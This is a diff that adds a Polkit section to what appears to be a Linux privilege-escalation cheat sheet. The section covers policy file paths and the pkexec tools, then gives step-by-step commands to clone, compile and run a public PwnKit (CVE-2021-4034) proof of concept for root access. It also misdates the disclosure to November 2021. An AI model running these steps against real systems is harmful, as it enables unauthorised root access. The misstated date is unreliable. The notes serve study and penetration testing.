@@ -2351,3 +2351,43 @@ sudo -u#-1 id
 ```
 
 ---
+
+# Polkit 
+
+## 📌 What is Polkit?
+- Authorization service for Linux systems.
+- Controls access between user applications and privileged system components.
+- Permissions can be set per user/app with various scopes (one-time, session, unlimited).
+
+## 📁 Key Components
+- **Actions/Policies**: `/usr/share/polkit-1/actions`
+- **Rules**: `/usr/share/polkit-1/rules.d`
+- **Local Rules**: `/etc/polkit-1/localauthority/50-local.d/*.pkla`
+
+
+## 🛠️ Polkit Tools
+- `pkexec`: Run commands as another user (like `sudo`)
+- `pkaction`: List available actions
+- `pkcheck`: Check if an action is authorized
+
+### Example:
+```bash
+pkexec -u root id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+
+## 🚨 CVE-2021-4034 – PwnKit
+- Memory corruption in `pkexec` → Privilege escalation to root.
+- Present for 10+ years, disclosed in Nov 2021.
+
+### Exploit Steps:
+```bash
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+cd CVE-2021-4034
+gcc cve-2021-4034-poc.c -o poc
+./poc
+# id → uid=0(root)
+```
+
+---
